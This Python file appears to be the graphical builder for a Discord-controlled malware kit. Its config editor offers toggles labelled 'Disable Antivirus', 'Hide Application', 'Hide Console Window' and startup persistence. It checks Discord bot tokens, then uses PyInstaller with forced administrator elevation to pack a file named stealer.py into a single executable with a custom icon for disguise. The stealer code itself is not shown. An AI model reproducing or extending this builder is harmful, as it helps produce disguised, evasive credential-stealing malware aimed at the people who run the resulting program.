import tkinter as tk
from tkinter import messagebox, filedialog
import re
import os
import subprocess
from PIL import Image, ImageTk
import requests

aliases = {
    "startup": "Enable Startup",
    "error": "Enable Error Notifications",
    "error_message": "Error Message",
    "disable_av": "Disable Antivirus",
    "hide": "Hide Application",
    "token": "Authentication Token",
    "token_1": "Backup 1",
    "token_2": "Backup 2",
    "token_3": "Backup 3",
    "hideconsole": "Hide Console Window"
}

def getfiledir(filename):
    file_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(file_dir, filename)

def update(file_path, key, new_value):
    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()

    config_found = False
    for i, line in enumerate(lines):
        if line.strip().startswith(f'"{key}":'):
            if isinstance(new_value, str):
                formatted_value = f'"{new_value}"'
            elif isinstance(new_value, (bool, int, float, None.__class__)):
                formatted_value = str(new_value)
            else:
                raise ValueError(f"Unsupported data type for new_value: {type(new_value)}")
            
            lines[i] = f'    "{key}": {formatted_value},\n'
            config_found = True
            break

    if config_found:
        with open(file_path, "w", encoding="utf-8") as file:
            file.writelines(lines)
    else:
        print(f"Key '{key}' not found in the config.")

def load(file_path):
    with open(file_path, "r", encoding="utf-8") as file:
        content = file.read()
    config_match = re.search(r'config\s*=\s*{(.*?)}', content, re.DOTALL)
    if not config_match:
        raise ValueError("Config section not found.")
    return eval("{" + config_match.group(1) + "}")

mainsrc = "main.py"

def save(ui_elements, file_path):
    try:
        for key, widget in ui_elements.items():
            new_value = widget.get() if isinstance(widget, tk.Entry) else widget.get()
            if isinstance(new_value, str) and new_value.lower() in ["true", "false"]:
                new_value = new_value.lower() == "true"
            update(file_path, key, new_value)
        messagebox.showinfo("Success", "Configuration updated successfully!")
        run(ui_elements)
    except Exception as e:
        messagebox.showerror("Error", f"Failed to save configuration: {e}")

def on_hover(event):
    event.widget.config(bg="#FF4081", fg="white")

def on_leave(event):
    event.widget.config(bg="#FF70A3", fg="black")

def select():
    global icon_path
    icon_path = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
    if icon_path:
        try:
            image = Image.open(icon_path)
            image = image.resize((100, 100), Image.Resampling.LANCZOS)
            photo = ImageTk.PhotoImage(image)
            preview_label.config(image=photo)
            preview_label.image = photo
            root.iconbitmap(icon_path)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load icon: {e}")
    return icon_path

def validate_bot(token):
    headers = {"Authorization": f"Bot {token}"}
    response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)

    if response.status_code == 200:
        return True, "Token validated successfully!"
    elif response.status_code == 401:
        return False, "Unauthorized token. Please check the token and try again."
    else:
        return False, f"Failed to validate token. API responded with status code {response.status_code}."

def run(ui_elements):
    tokenmain = ui_elements["token"].get()
    token_1 = ui_elements["token_1"].get()
    token_2 = ui_elements["token_2"].get()
    token_3 = ui_elements["token_3"].get()

    valid_tokens = []
    for token in [tokenmain, token_1, token_2, token_3]:
        is_valid, message = validate_bot(token)
        if is_valid:
            valid_tokens.append(token)

    if valid_tokens:
        messagebox.showinfo("Valid Tokens", f"Valid tokens:\n{', '.join(valid_tokens)}")
    else:
        messagebox.showerror("Error", "All tokens are invalid. Please check your tokens.")

def build(icon=None):
    try:
        libopus_path = getfiledir('libopus-0.x64.dll')
        stealer_path = getfiledir('stealer.py')
        mainpy = getfiledir('main.py')

        if libopus_path:
            print("ok")
        
        if stealer_path:
            print("ok 2")

        if mainpy:
            print('ok 3')

        cmd = [
            'python', '-m', 'PyInstaller', '--onefile', '--clean', '--uac-admin',
            f'--add-binary={libopus_path};.',
            f'--add-data={stealer_path};.',
            f'{mainpy}'
        ]

        if icon:
            cmd += ['--icon', icon]

        messagebox.showinfo("Building...", "Thanks for building. The program won't respond. Press 'Okay' to start building.")

        subprocess.run(cmd, check=True)
        messagebox.showinfo("Success", "EXE built successfully!")
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error", f"Error: {e}")
    except Exception as e:
        messagebox.showerror("Error", f"Error: {e}")

def create_ui(file_path):
    global root, preview_label, icon_path
    icon_path = None
    root = tk.Tk()
    root.title("Config Editor")
    root.geometry("900x700")
    root.config(bg="#2b2b2b")
    
    root.resizable(True, True)

    canvas = tk.Canvas(root, bg="#2b2b2b")
    scrollbar = tk.Scrollbar(root, orient="vertical", command=canvas.yview)
    canvas.config(yscrollcommand=scrollbar.set)
    
    canvas.grid(row=0, column=0, sticky="nsew")
    scrollbar.grid(row=0, column=1, sticky="ns")

    scrollable_frame = tk.Frame(canvas, bg="#2b2b2b")
    canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")

    scrollable_frame.bind(
        "<Configure>", 
        lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
    )

    root.grid_rowconfigure(0, weight=1)
    root.grid_columnconfigure(0, weight=1)

    config = load(file_path)
    ui_elements = {}
    row = 0

    header_label = tk.Label(scrollable_frame, text="Configuration Editor", font=("Helvetica", 20, "bold"), bg="#2b2b2b", fg="#FF4081")
    header_label.grid(row=row, column=0, columnspan=2, pady=30)
    row += 1

    for key, value in config.items():
        alias = aliases.get(key, key)
        label = tk.Label(scrollable_frame, text=alias, font=("Arial", 12), bg="#2b2b2b", fg="#FFFFFF", anchor="w")
        label.grid(row=row, column=0, sticky="w", padx=20, pady=15)

        if isinstance(value, bool):
            var = tk.BooleanVar(value=value)
            checkbutton = tk.Checkbutton(scrollable_frame, variable=var, bg="#2b2b2b", fg="#FFFFFF", selectcolor="#FF4081")
            checkbutton.grid(row=row, column=1, padx=10, pady=10, sticky="w")
            ui_elements[key] = var
        elif isinstance(value, str):
            entry = tk.Entry(scrollable_frame, font=("Arial", 12), width=40, bg="#444444", fg="#FFFFFF", insertbackground="white")
            entry.insert(0, value)
            entry.grid(row=row, column=1, padx=10, pady=10)
            ui_elements[key] = entry
        elif isinstance(value, (int, float)):
            entry = tk.Entry(scrollable_frame, font=("Arial", 12), width=40, bg="#444444", fg="#FFFFFF", insertbackground="white")
            entry.insert(0, str(value))
            entry.grid(row=row, column=1, padx=10, pady=10)
            ui_elements[key] = entry

        row += 1

    icon_button = tk.Button(scrollable_frame, text="Select Icon (.ico)", font=("Arial", 12), relief="flat", bg="#FF70A3", fg="black", command=select)
    icon_button.grid(row=row, column=0, columnspan=2, pady=20, padx=20)

    preview_label = tk.Label(scrollable_frame, bg="#2b2b2b")
    preview_label.grid(row=row + 1, column=0, columnspan=2, pady=10)

    row += 2

    save_button = tk.Button(scrollable_frame, text="Save Configuration", font=("Arial", 14, "bold"), relief="flat", bg="#FF70A3", fg="black", command=lambda: save(ui_elements, file_path))
    save_button.grid(row=row, column=0, columnspan=2, pady=30, padx=20)
    save_button.bind("<Enter>", on_hover)
    save_button.bind("<Leave>", on_leave)

    build_button = tk.Button(scrollable_frame, text="Build EXE", font=("Arial", 14, "bold"), relief="flat", bg="#FF70A3", fg="black", command=lambda: build(icon_path))
    build_button.grid(row=row + 1, column=0, columnspan=2, pady=30, padx=20)
    build_button.bind("<Enter>", on_hover)
    build_button.bind("<Leave>", on_leave)

    def on_focus_in(event):
        event.widget.config(bg="#555555")

    def on_focus_out(event):
        event.widget.config(bg="#444444")

    for entry in ui_elements.values():
        if isinstance(entry, tk.Entry):
            entry.bind("<FocusIn>", on_focus_in)
            entry.bind("<FocusOut>", on_focus_out)

    root.mainloop()

create_ui(file_path=mainsrc)
